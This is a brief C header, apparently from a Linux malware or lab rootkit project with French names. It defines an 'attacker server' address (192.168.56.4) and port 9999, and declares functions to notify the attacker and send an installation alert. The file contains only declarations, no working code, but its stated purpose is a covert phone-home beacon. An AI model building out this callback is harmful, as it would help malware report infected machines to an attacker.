#ifndef NOTIFICATION_H
#define NOTIFICATION_H

#include <linux/socket.h>

#define PORT_NOTIFICATION 9999
#define SERVEUR_ATTAQUANT "192.168.56.4"

int notifier_attaquant(void);
int envoyer_alerte_installation(void);

#endif
